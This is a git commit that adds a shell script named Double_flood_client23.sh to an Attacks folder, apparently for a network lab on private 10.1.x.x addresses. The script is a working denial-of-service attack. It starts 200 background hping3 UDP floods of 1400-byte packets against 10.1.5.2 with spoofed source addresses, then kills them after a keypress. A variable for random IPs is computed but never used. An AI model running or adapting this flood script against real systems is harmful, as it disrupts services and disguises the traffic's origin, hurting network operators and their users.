4f2acf2e15deeb940a27224735d66c3ca98e1c74
Sean Lee <seanklee04@gmail.com>
2026-04-26 11:23:19 -0400

    Create Double_flood_client23.sh

---
+++ Attacks/Double_flood_client23.sh
@@ -0,0 +1,10 @@
+for i in {1..100}; do
+   RANDOM_IP="10.1.$((RANDOM % 256)).$((RANDOM % 256))"
+   sudo hping3 -I eth1 -2 -p 12345 -d 1400 --flood -a 10.1.3.2 10.1.5.2 &
+ done
+for i in {1..100}; do
+   RANDOM_IP="10.1.$((RANDOM % 256)).$((RANDOM % 256))"
+   sudo hping3 -I eth1 -2 -p 12345 -d 1400 --flood -a 10.1.4.2 10.1.5.2 & 
+done
+read
+sudo pkill hping3
